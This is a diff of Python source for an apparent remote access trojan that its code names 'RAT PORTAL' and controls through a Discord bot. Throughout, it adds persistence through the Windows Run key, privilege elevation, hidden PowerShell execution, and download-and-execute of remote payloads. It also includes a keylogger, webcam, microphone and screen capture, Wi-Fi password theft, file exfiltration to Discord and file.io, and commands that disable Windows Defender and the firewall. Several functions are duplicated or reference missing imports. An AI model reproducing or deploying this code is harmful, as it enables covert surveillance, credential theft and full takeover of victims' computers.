@@ -1,4 +1,18 @@
-
+import ssl
+import discord
+from discord.ext import commands
+import requests
+import socket
+import datetime
+import os
+import sys
+import ctypes
+import asyncio
+import subprocess
+import winreg
+import pyautogui
+from io import BytesIO
+import urllib.parse
 import win32com.client as wincl 
 import asyncio
 import base64
@@ -41,66 +55,77 @@ from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
 from win32crypt import CryptUnprotectData
 import numpy as np
-from Cookies import Browsers, create_temp
-import Password
-from Token import grab_discord
 import ctypes
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import Structure, c_uint, c_int, sizeof, windll, byref
 import win32com.client as wincl
 
-intents = discord.Intents().all()
 
+
+
+
+# Initialize intents
+intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Feature : PUBLIC IP ADDRESS FETCH
+# Feature: PUBLIC IP ADDRESS FETCH
 def get_public_ip():
     try:
         response = requests.get('https://api.ipify.org/?format=json')
         data = response.json()
         public_ip = data['ip']
         return public_ip
-    except:
+    except requests.RequestException as e:
+        print(f"Request failed: {e}")
         return 'N/A'
 
-# Feature : CREATE CATEGORY & CHANNELS
+# Feature: CREATE CATEGORY & CHANNELS
 @bot.event
 async def on_ready():
     print(f'Bot connected as {bot.user.name}')
-    guild = bot.guilds[0]  # Assuming the bot is only in one guild/server
+    for guild in bot.guilds:
+        # Check if the category and channels already exist
+        category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
+        if not category:
+            # Create the category
+            category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')
 
-    # Check if the category and channels already exist
-    category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
-    if not category:
-        # Create the category
-        category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')
+            # Create the channels
+            channel_names = [
+                '・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', 
+                '・⌨│ᴛᴇʀᴍɪɴᴀʟ', 
+                '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', 
+                '・🔑│ᴋᴇʏʟᴏɢꜱ', 
+                '・🔔│ʀᴀᴛ-ʟᴏɢꜱ', 
+                '・🔉│ voice-ʟᴏɢꜱ'
+            ]
+            for name in channel_names:
+                await guild.create_text_channel(name, category=category)
 
-        # Create the channels
-        channel_names = ['・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', '・⌨│ᴛᴇʀᴍɪɴᴀʟ', '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', '・🔑│ᴋᴇʏʟᴏɢꜱ', '・🔔│ʀᴀᴛ-ʟᴏɢꜱ', '・🔉│ voice-ʟᴏɢꜱ']
-        for name in channel_names:
-            await guild.create_text_channel(name, category=category)
+        # Get system information
+        system_name = socket.gethostname()
+        public_ip = get_public_ip()
+        try:
+            system_ip = socket.gethostbyname(system_name)
+        except socket.gaierror:
+            system_ip = 'N/A'
 
-    # Get system information
-    system_name = socket.gethostname()
-    public_ip = get_public_ip()
-    system_ip = socket.gethostbyname(socket.gethostname())
+        # Find the channel for device logs
+        device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
+        if device_logs_channel:
+            embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
+            embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
+            embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
+            embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)  # Bold Text: System IP Address
 
-    # Find the channel for device logs
-    device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
-    if device_logs_channel:
-        embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
-        embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
-        embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
-        embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)  # Bold Text: System IP Address
+            # Add Footer with bot, date, and time information
+            current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            footer_text = f'RAT | Date: {current_time}'
+            embed.set_footer(text=footer_text)
 
-        # Add Footer with bot, date, and time information
-        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        footer_text = f'RAT | Date: {current_time}'
-        embed.set_footer(text=footer_text)
+            await device_logs_channel.send(embed=embed)
 
-        await device_logs_channel.send(embed=embed)
-
-# Dictionary containing command descriptions
+# Command descriptions
 command_descriptions = {
     "cam_list": "Displays a list of available webcams.",
     "!camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID.",
@@ -113,16 +138,17 @@ command_descriptions = {
     "!ping": "Checks if the bot is online and responsive.",
     "!powershell <cmd>": "Executes the provided PowerShell command.",
     "!bot_down": "Shuts down the bot.",
-    "!voice_get 20": "gets audio recored from system where 20 respresents duration in seconds",
+    "!voice_get 20": "Gets audio recorded from the system where 20 represents the duration in seconds.",
     "!!stopscreen": "Stops a screenshot of the current screen.",
     "!set_payload <url>": "Automatically executes and deletes a payload from the provided URL.",
     "!sys_info": "Retrieves and displays system information.",
     "!sys_log": "Retrieves and displays system logs.",
     "!sys_restart": "Restarts the system.",
     "!sys_shutdown": "Shuts down the system.",
-    "!streamscreen": "Sends the screenshot and sends ."
+    "!streamscreen": "Sends the screenshot and sends."
 }
 
+# Bot help command
 @bot.command(name='bot_help')
 async def bot_help(ctx):
     help_message = "**Available Commands:**\n\n"
@@ -133,63 +159,48 @@ async def bot_help(ctx):
     boxed_help_message = f"```md\n{help_message}```"
     await ctx.send(boxed_help_message)
 
-# Feature : REGISTRY INJECTION
+# Function to remove startup key
 def remove_startup_key():
     try:
-        # Open the "Run" registry key
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-
-        # Delete the registry value
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
         winreg.DeleteValue(key, "MyStartupKey")
-
-        # Close the registry key
         winreg.CloseKey(key)
     except FileNotFoundError:
         pass
 
+# Function to add to startup
 def add_to_startup():
-    # Open the "Run" registry key
-    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
-    
-    # Get the path to the current executable
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
     executable_path = os.path.abspath(sys.executable)
-    
-    # Create a new registry value with your desired name and executable path
     winreg.SetValueEx(key, "MyStartupKey", 0, winreg.REG_SZ, executable_path)
-    
-    # Close the registry key
     winreg.CloseKey(key)
 
+# Function to run as admin
 def run_as_admin():
-    # Get the script filename
     script_filename = os.path.abspath(sys.argv[0])
-
-    # Get the required privileges elevation parameters
     params = f'"{script_filename}"'
     shell32 = ctypes.windll.shell32
     shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
 
+# Check if the script is executed as the main program
 if __name__ == "__main__":
-    remove_startup_key()  # Remove existing registry entry if present
+    remove_startup_key()
     try:
         add_to_startup()
     except PermissionError:
         run_as_admin()
 
-# Command : POWERSHELL
+# Powershell command
 @bot.command()
 async def powershell(ctx, *, command):
     try:
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window
-
+        startupinfo.wShowWindow = subprocess.SW_HIDE
         output = subprocess.check_output(["powershell", command], startupinfo=startupinfo, universal_newlines=True)
-
         if len(output) > 2000:
             with open('output.txt', 'w', encoding='utf-8') as file:
                 file.write(output)
-
             await ctx.send(file=discord.File('output.txt'))
             os.remove('output.txt')
         else:
@@ -197,7 +208,7 @@ async def powershell(ctx, *, command):
     except subprocess.CalledProcessError as e:
         await ctx.send(f'Command execution failed with error code {e.returncode}')
 
-# Command : SYSTEM LOG 
+# System log command
 @bot.command()
 async def sys_log(ctx):
     try:
@@ -214,11 +225,13 @@ async def sys_log(ctx):
         await asyncio.sleep(1)
         await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count - 1} seconds left```")
 
+        # Use PowerShell to get system logs
         startupinfo = subprocess.STARTUPINFO()
         startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
         startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window
 
-        output = subprocess.check_output(["powershell", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"], startupinfo=startupinfo, universal_newlines=True)
+        command = ["powershell", "-Command", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"]
+        output = subprocess.check_output(command, startupinfo=startupinfo, universal_newlines=True)
 
         with open('syslog.txt', 'w', encoding='utf-8') as file:
             file.write(output)
@@ -229,61 +242,18 @@ async def sys_log(ctx):
 
     except subprocess.CalledProcessError as e:
         await ctx.send(f'Command execution failed with error code {e.returncode}')
+    except Exception as e:
+        await ctx.send(f'An unexpected error occurred: {str(e)}')
 
-# Function : SCREENLOGGER
-screenlogger_enabled = False
-
-# Function to send keylogs and screenshots to Discord channel as an embed message
-async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
-    global screenlogger_enabled
-
-    while screenlogger_enabled:
-        # Capture screenshot
-        screenshot = pyautogui.screenshot()
-        screenshot_bytes = BytesIO()
-        screenshot.save(screenshot_bytes, format='PNG')
-        screenshot_bytes.seek(0)
-
-        # Create the embed object
-        embed = discord.Embed(title='Screenshot', color=discord.Color.blue())
-
-        # Attach the screenshot to the embed
-        file = discord.File(screenshot_bytes, filename='screenshot.png')
-        embed.set_image(url='attachment://screenshot.png')
-
-        # Send the embed message to the specified channel
-        channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
-        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
-        if channel:
-            await channel.send(embed=embed, file=file)
-
-        # Schedule the next execution of the coroutine after 10 seconds
-        await asyncio.sleep(10)
-
-# Command: SCREENLOGGER
+#lock pc
 @bot.command()
-async def screenlogger(ctx, state):
-    global screenlogger_enabled
+async def lock_sys(ctx):
+    ctypes.windll.user32.LockWorkStation()
+    await ctx.send('PC locked.')
 
-    channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
 
-    if state == 'on':
-        if not screenlogger_enabled:
-            screenlogger_enabled = True
-            asyncio.create_task(send_logs_and_screenshot(ctx))  # Pass ctx as an argument
-            await ctx.send('Screenlogger is now ``Enabled 🟢``')
-        else:
-            await ctx.send('Screenlogger is **Already** ``Enabled 🟢``')
-    elif state == 'off':
-        if screenlogger_enabled:
-            screenlogger_enabled = False
-            await ctx.send('Screenlogger is now ``Disabled ⚫``')
-        else:
-            await ctx.send('Screenlogger is **Already** ``Disabled ⚫``')
-    else:
-        await ctx.send('Invalid state. Please use `on` or `off`.')
 
-# Command: SET PAYLOAD
+#set playload 
 @bot.command()
 async def set_payload(ctx, url: str):
     try:
@@ -306,23 +276,24 @@ async def set_payload(ctx, url: str):
 
             except (requests.RequestException, IOError) as e:
                 await ctx.send(f'Error downloading the file: {str(e)}. Retrying in {retry_delay} seconds...')
-                time.sleep(retry_delay)
+                await asyncio.sleep(retry_delay)
 
                 if attempt == max_retry_attempts:
                     await ctx.send('Maximum number of retry attempts reached. Unable to download the file.')
                     return
 
-        home_dir = os.path.expanduser("~")
-        downloads_folder = os.path.join(home_dir, "Downloads")
-        file_path = os.path.join(downloads_folder, filename)
-        
+        # Use a temporary directory instead of the Downloads folder
+        temp_dir = os.path.join(os.path.expanduser("~"), "Downloads")
+        file_path = os.path.join(temp_dir, filename)
+
         with open(file_path, 'wb') as file:
             file.write(content)
 
         await ctx.send(f'File downloaded successfully to ``📁 {file_path}``')
 
-        command = f'start-process -FilePath "{file_path}"'
-        subprocess.run(['powershell.exe', '-Command', command], shell=True)
+        # Execute the file using PowerShell
+        command = ['powershell.exe', '-Command', f'start-process -FilePath "{file_path}"']
+        subprocess.run(command, shell=True)
 
         await ctx.send('File installed and executed.')
 
@@ -332,13 +303,15 @@ async def set_payload(ctx, url: str):
 
         await ctx.send('File deleted permanently.')
 
-    except Exception as e:
+    except (urllib.error.URLError, requests.exceptions.RequestException, IOError) as e:
         await ctx.send(f'Error: {str(e)}')
 
-# Command: SCREENSHOT
+    except Exception as e:
+        await ctx.send(f'Unexpected error: {str(e)}')
 
 
-# Command : GRAB WIFI
+
+#to get wifi passward
 @bot.command()
 async def grab_wifi(ctx):
     try:
@@ -365,7 +338,282 @@ async def grab_wifi(ctx):
     except Exception as e:
         await ctx.send(f'Error occurred while retrieving Wi-Fi passwords: {str(e)}')
 
-# Command : PING
+#dowload function
+@bot.command()
+async def download(ctx, source_path):
+    target_channel = ctx.message.channel  # Use the current Discord channel as the target channel
+    try:
+        with open(source_path, 'rb') as file:
+            await target_channel.send(file=discord.File(file))
+        filename = os.path.basename(source_path)
+        await ctx.send(f"📁 ``{filename}`` Downloaded Successfully!")
+    except FileNotFoundError:
+        await ctx.send("Source file not found.")
+
+# Command : CAM LIST
+@bot.command()
+async def cam_list(ctx):
+    # Get the list of available webcam devices
+    device_list = []
+    for i in range(10):
+        cap = cv2.VideoCapture(i)
+        if cap.isOpened():
+            _, _ = cap.read()
+            device_list.append(f"Webcam {i}")
+            cap.release()
+        else:
+            break
+
+    # Send the list of webcam devices to Discord
+    device_info = '\n'.join(device_list)
+    await ctx.send(f"Available webcam devices:\n{device_info}")
+
+# Command : CAMIC
+@bot.command()
+async def camic(ctx, device_id=None):
+    # Check if a specific webcam device is provided
+    if device_id is not None:
+        try:
+            device_id = int(device_id)
+        except ValueError:
+            await ctx.send("Invalid device ID. Please provide a valid numeric ID.")
+            return
+    else:
+        device_id = 0  # Default to the first webcam device
+
+    # Capture photo from the specified webcam
+    cap = cv2.VideoCapture(device_id)
+    if not cap.isOpened():
+        await ctx.send("Failed to open the webcam device.")
+        return
+
+    ret, frame = cap.read()
+
+    # Convert the frame to bytes
+    _, buffer = cv2.imencode('.jpg', frame)
+    img_bytes = buffer.tobytes()
+
+    # Send the photo to Discord
+    picture = discord.File(io.BytesIO(img_bytes), filename='webcam_photo.jpg')
+    await ctx.send(file=picture)
+
+    # Release the webcam
+    cap.release()
+
+# Command : LIST PROCESS
+@bot.command()
+async def list_process(ctx):
+    try:
+        process_list = psutil.process_iter()
+        processes = [p.name() for p in process_list]
+
+        if processes:
+            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
+            process_str = ""
+            for chunk in process_chunks:
+                process_str += '\n'.join(chunk) + '\n'
+
+            file = io.BytesIO(process_str.encode())
+            await ctx.send(file=File(file, filename='process_list.txt'))
+        else:
+            await ctx.send('No process found.')
+
+    except Exception as e:
+        await ctx.send(f'Error listing process: {str(e)}')
+
+# Command : KILL PROCESS
+@bot.command()
+async def kill_process(ctx, name: str):
+    try:
+        if sys.platform == 'win32':
+            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
+        else:
+            process = subprocess.run(['killall', name], capture_output=True)
+
+        if process.returncode == 0:
+            await ctx.send(f'Process ``{name}`` killed.')
+        else:
+            error_output = process.stderr.decode().strip()
+            await ctx.send(f'Error killing process: {error_output}')
+
+    except Exception as e:
+        await ctx.send(f'Error killing process: {str(e)}')
+
+# Command : RAT SHUTDOWN
+@bot.command()
+@commands.is_owner()
+async def rat_down(ctx):
+    await ctx.send("``🔩 Shutting down...``")
+    await bot.close()
+
+# Command : SYSTEM SHUTDOWN
+@bot.command()
+async def sys_shutdown(ctx):
+    await ctx.send("Shutting down...")
+    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)
+
+# Command : SYSTEM RESTART
+@bot.command()
+async def sys_restart(ctx):
+    await ctx.send("Restarting...")
+    subprocess.run(["shutdown", "/r", "/t", "0"])
+    
+# Command : CLEAR
+@bot.command()
+@commands.is_owner()
+async def clear(ctx, amount: int):
+    await ctx.channel.purge(limit=amount + 1)
+    await ctx.send(f"``Cleared {amount} messages 🗑️``", delete_after=3)
+
+#get voice recording
+@bot.command()
+async def voice_rec(ctx, duration: int):
+    # Check if the duration is valid
+    if duration <= 0:
+        await ctx.send("Duration must be a positive integer.")
+        return
+
+    # Start recording audio from the system microphone
+    fs = 44100  # Sample rate
+    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
+    sd.wait()
+
+    # Save the recorded audio to a file
+    filename = "recorded_audio.wav"
+    sf.write(filename, recording, fs)
+
+    #Send the recorded audio to a specific text channel
+    text_channel_id =   1236994695180062720
+    text_channel = bot.get_channel(text_channel_id)
+    if text_channel:
+        await text_channel.send(file=discord.File(filename))
+        await ctx.send("[*] Audio sent to specified text channel successfully")
+    else:
+        await ctx.send("Text channel not found.")
+
+#keylog
+@bot.command()
+async def start_keylogger(ctx):
+    await ctx.send("Keylogger started.")
+
+    def on_press(key):
+        try:
+            key_char = key.char
+        except AttributeError:
+            key_char = str(key)
+        
+        # Send the key to the Discord channel
+        channel = bot.get_channel(1236994679560601693)  # Replace YOUR_CHANNEL_ID with your channel's ID
+        if channel:
+            asyncio.ensure_future(channel.send(f"Key pressed: {key_char}"))
+
+    # Start the keylogger
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+
+
+
+
+#streamscrenn
+@bot.command()
+async def recscreen(ctx):
+    try:
+        reclenth = float(ctx.message.content[10:])
+    except ValueError:
+        await ctx.send("Invalid duration. Please specify a valid number after '!recscreen'.")
+        return
+    if reclenth <= 0:
+        await ctx.send("Invalid duration. Please specify a positive number after '!recscreen'.")
+        return
+
+    input2 = 0
+    while True:
+        input2 = input2 + 1
+        input3 = 0.045 * input2
+        if input3 >= reclenth:
+            break
+
+    SCREEN_SIZE = (1920, 1080)
+    fourcc = cv2.VideoWriter_fourcc(*"XVID")
+    temp = os.getenv('TEMP')
+    videeoo = os.path.join(temp, "output.avi")
+    out = cv2.VideoWriter(videeoo, fourcc, 20.0, SCREEN_SIZE)
+    counter = 1
+    while True:
+        counter = counter + 1
+        img = pyautogui.screenshot()
+        frame = np.array(img)
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        out.write(frame)
+        if counter >= input2:
+            break
+    out.release()
+    check = os.path.join(temp, "output.avi")
+    check2 = os.stat(check).st_size
+    if check2 > 7340032:
+        await ctx.send("This may take some time because it is over 8 MB. Please wait.")
+        with open(check, "rb") as f:
+            boom = requests.post('https://file.io/', files={"file": f}).json()["link"]
+        await ctx.send("Video download link: " + boom)
+        await ctx.send("[*] Command successfully executed")
+        os.remove(check)
+    else:
+        file = discord.File(check, filename="output.avi")
+        await ctx.send("[*] Command successfully executed", file=file)
+        os.remove(check)
+@bot.command
+async def disableantivirus(message):
+   
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        if is_admin:
+            instruction = """REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber" """
+            output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = str(output.stdout.decode('CP437'))
+            build_number = result.split()[2:]
+            if build_number <= ['17763']:
+                os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
+                await message.channel.send("[*] Windows Defender disabled successfully.")
+            elif build_number >= ['18362']:
+                os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
+                await message.channel.send("[*] Windows Defender exclusion added successfully.")
+            else:
+                await message.channel.send("[*] An unknown error has occurred.")
+        else:
+            await message.channel.send("[*] This command requires admin privileges.")
+@bot.command()
+async def disableantivirus(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin:
+        instruction = 'REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" | findstr /I /C:"CurrentBuildnumber"'
+        output = subprocess.run(instruction, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        result = str(output.stdout.decode('CP437'))
+        build_number = result.split()[2:]
+        if build_number <= ['17763']:
+            os.system(r"Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet")
+            await ctx.send("[*] Windows Defender disabled successfully.")
+        elif build_number >= ['18362']:
+            os.system(r"""powershell Add-MpPreference -ExclusionPath "C:\\" """)
+            await ctx.send("[*] Windows Defender exclusion added successfully.")
+        else:
+            await ctx.send("[*] An unknown error has occurred.")
+    else:
+        await ctx.send("[*] This command requires admin privileges.")
+
+@bot.command()
+async def disablefirewall(ctx):
+    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    if is_admin:
+        os.system(r"netsh advfirewall set allprofiles state off")
+        await ctx.send("[*] Windows Firewall disabled successfully.")
+    else:
+        await ctx.send("[*] This command requires admin privileges.")
+
+
+
+
+
+
+
 @bot.command()
 async def ping(ctx):
     start_time = datetime.datetime.now()
@@ -586,364 +834,78 @@ async def sys_info(ctx):
         code_block_message = f"```{message}```"  # Send As A Box
         await ctx.send(code_block_message)
 
-# Command : DOWNLOAD
-@bot.command()
-async def download(ctx, source_path):
-    target_channel = ctx.message.channel  # Use the current Discord channel as the target channel
-    try:
-        with open(source_path, 'rb') as file:
-            await target_channel.send(file=discord.File(file))
-        filename = os.path.basename(source_path)
-        await ctx.send(f"📁 ``{filename}`` Downloaded Successfully!")
-    except FileNotFoundError:
-        await ctx.send("Source file not found.")
 
-# Command : CAM LIST
+
+screen_share_enabled = False  # Define screen_share_enabled globally
+
 @bot.command()
-async def cam_list(ctx):
-    # Get the list of available webcam devices
-    device_list = []
-    for i in range(10):
-        cap = cv2.VideoCapture(i)
-        if cap.isOpened():
-            _, _ = cap.read()
-            device_list.append(f"Webcam {i}")
-            cap.release()
+async def screen_share(ctx, state: str):  # Make sure state is explicitly typed as a string
+    global screen_share_enabled
+
+    channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
+
+    if state == 'on':
+        if not screen_share_enabled:
+            screen_share_enabled = True
+            asyncio.create_task(send_logs_and_screenshot(ctx))  # Pass ctx as an argument
+            await ctx.send('Screenlogger is now ``Enabled 🟢``')
         else:
-            break
-
-    # Send the list of webcam devices to Discord
-    device_info = '\n'.join(device_list)
-    await ctx.send(f"Available webcam devices:\n{device_info}")
-
-# Command : CAMIC
-@bot.command()
-async def camic(ctx, device_id=None):
-    # Check if a specific webcam device is provided
-    if device_id is not None:
-        try:
-            device_id = int(device_id)
-        except ValueError:
-            await ctx.send("Invalid device ID. Please provide a valid numeric ID.")
-            return
+            await ctx.send('Screenlogger is **Already** ``Enabled 🟢``')
+    elif state == 'off':
+        if screen_share_enabled:
+            screen_share_enabled = False
+            await ctx.send('Screenlogger is now ``Disabled ⚫``')
+        else:
+            await ctx.send('Screenlogger is **Already** ``Disabled ⚫``')
     else:
-        device_id = 0  # Default to the first webcam device
+        await ctx.send('Invalid state. Please use `on` or `off`.')
 
-    # Capture photo from the specified webcam
-    cap = cv2.VideoCapture(device_id)
-    if not cap.isOpened():
-        await ctx.send("Failed to open the webcam device.")
-        return
-
-    ret, frame = cap.read()
-
-    # Convert the frame to bytes
-    _, buffer = cv2.imencode('.jpg', frame)
-    img_bytes = buffer.tobytes()
-
-    # Send the photo to Discord
-    picture = discord.File(io.BytesIO(img_bytes), filename='webcam_photo.jpg')
-    await ctx.send(file=picture)
-
-    # Release the webcam
-    cap.release()
-
-# Command : LIST PROCESS
+# Start logging command
 @bot.command()
-async def list_process(ctx):
-    try:
-        process_list = psutil.process_iter()
-        processes = [p.name() for p in process_list]
+async def start_logging(ctx):
+    global screen_share_enabled
+    screen_share_enabled = True
+    await send_logs_and_screenshot(ctx)
 
-        if processes:
-            process_chunks = [processes[i:i + 20] for i in range(0, len(processes), 20)]
-            process_str = ""
-            for chunk in process_chunks:
-                process_str += '\n'.join(chunk) + '\n'
+# Stop logging command
+@bot.command()
+async def stop_logging(ctx):
+    global screen_share_enabled
+    screen_share_enabled = False
+    await ctx.send("Screen logging stopped.")
 
-            file = io.BytesIO(process_str.encode())
-            await ctx.send(file=File(file, filename='process_list.txt'))
+# Function to send logs and screenshot
+async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
+    global screen_share_enabled
+
+    while screen_share_enabled:
+        # Capture screenshot
+        screenshot = pyautogui.screenshot()
+        screenshot_bytes = BytesIO()
+        screenshot.save(screenshot_bytes, format='PNG')
+        screenshot_bytes.seek(0)
+
+        # Create the embed object
+        embed = discord.Embed(title='Screenshot', color=discord.Color.blue())
+
+        # Attach the screenshot to the embed
+        file = discord.File(screenshot_bytes, filename='screenshot.png')
+        embed.set_image(url='attachment://screenshot.png')
+
+        # Send the embed message to the specified channel
+        channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
+        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
+        if channel:
+            await channel.send(embed=embed, file=file)
         else:
-            await ctx.send('No process found.')
+            await ctx.send(f"Channel '{channel_name}' not found.")
+            screen_share_enabled = False  # Stop logging if the channel is not found
 
-    except Exception as e:
-        await ctx.send(f'Error listing process: {str(e)}')
-
-# Command : KILL PROCESS
-@bot.command()
-async def kill_process(ctx, name: str):
-    try:
-        if sys.platform == 'win32':
-            process = subprocess.run(['taskkill', '/F', '/IM', name], capture_output=True)
-        else:
-            process = subprocess.run(['killall', name], capture_output=True)
-
-        if process.returncode == 0:
-            await ctx.send(f'Process ``{name}`` killed.')
-        else:
-            error_output = process.stderr.decode().strip()
-            await ctx.send(f'Error killing process: {error_output}')
-
-    except Exception as e:
-        await ctx.send(f'Error killing process: {str(e)}')
-
-# Command : RAT SHUTDOWN
-@bot.command()
-@commands.is_owner()
-async def rat_down(ctx):
-    await ctx.send("``🔩 Shutting down...``")
-    await bot.close()
-
-# Command : SYSTEM SHUTDOWN
-@bot.command()
-async def sys_shutdown(ctx):
-    await ctx.send("Shutting down...")
-    subprocess.call(["shutdown", "/s", "/t", "0"], shell=True)
-
-# Command : SYSTEM RESTART
-@bot.command()
-async def sys_restart(ctx):
-    await ctx.send("Restarting...")
-    subprocess.run(["shutdown", "/r", "/t", "0"])
-    
-# Command : CLEAR
-@bot.command()
-@commands.is_owner()
-async def clear(ctx, amount: int):
-    await ctx.channel.purge(limit=amount + 1)
-    await ctx.send(f"``Cleared {amount} messages 🗑️``", delete_after=3)
+        # Schedule the next execution of the coroutine after 10 seconds
+        await asyncio.sleep(10)
 
 
-@bot.event
-async def on_error(event, *args, **kwargs):
-    channel = discord.utils.get(bot.get_all_channels(), name='・🔔│ʀᴀᴛ-ʟᴏɢꜱ')
-
-    # Get the exception information
-    exception_type, exception, traceback = sys.exc_info()
-
-    # Log the error message
-    error_message = f"An error occurred in event {event}: {exception}"
-    await channel.send(f"``{error_message}``")
-
-    # Print the error to the console
-    traceback.print_exception(exception_type, exception, traceback)
-
-
-# Command: SET PAYLOAD
-@bot.command()
-async def voice_send(ctx, *, message: str):
-    tts = gTTS(text=message, lang='en')
-    tts.save('message.mp3')
-    await ctx.send(file=discord.File('message.mp3'))
-
-@bot.command()
-async def voice_get(ctx, duration: int):
-    # Check if the duration is valid
-    if duration <= 0:
-        await ctx.send("Duration must be a positive integer.")
-        return
-
-    # Start recording audio from the system microphone
-    fs = 44100  # Sample rate
-    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
-    sd.wait()
-
-    # Save the recorded audio to a file
-    filename = "recorded_audio.wav"
-    sf.write(filename, recording, fs)
-
-    # Send the recorded audio to a specific text channel
-    text_channel_id =   # Replace with your desired text channel ID
-    text_channel = bot.get_channel(text_channel_id)
-    if text_channel:
-        await text_channel.send(file=discord.File(filename))
-        await ctx.send("[*] Audio sent to specified text channel successfully")
-    else:
-        await ctx.send("Text channel not found.")
-
-
-@bot.command
-async def streamscreen(message):
-    
-        await message.channel.send("[*] Command successfully executed")
-        temp_dir = os.getenv('TEMP')
-        hellos = os.path.join(temp_dir, "hobos", "hellos.txt")
-        if os.path.isfile(hellos):
-            os.remove(hellos)
-            os.rmdir(os.path.join(temp_dir, "hobos"))
-        while True:
-            with mss() as sct:
-                sct.shot(output=os.path.join(temp_dir, "monitor.png"))
-            path = os.path.join(temp_dir, "monitor.png")
-            file = discord.File(path, filename="monitor.png")
-            await message.channel.send(file=file)
-            if os.path.isfile(hellos):
-                break
-
-@bot.command
-async def stopscreen(message):
-
-        temp_dir = os.getenv('TEMP')
-        os.makedirs(os.path.join(temp_dir, "hobos"), exist_ok=True)
-        with open(os.path.join(temp_dir, "hobos", "hellos.txt"), "w") as f:
-            f.write("hello")
-        if os.path.isfile(os.path.join(temp_dir, "monitor.png")):
-            os.remove(os.path.join(temp_dir, "monitor.png"))
-@bot.command
-async def recscreen(message):
-   
-        try:
-            reclenth = float(message.content[10:])
-        except ValueError:
-            await message.channel.send("Invalid duration. Please specify a valid number after '!recscreen'.")
-            return
-        if reclenth <= 0:
-            await message.channel.send("Invalid duration. Please specify a positive number after '!recscreen'.")
-            return
-
-        input2 = 0
-        while True:
-            input2 = input2 + 1
-            input3 = 0.045 * input2
-            if input3 >= reclenth:
-                break
-        SCREEN_SIZE = (1920, 1080)
-        fourcc = cv2.VideoWriter_fourcc(*"XVID")
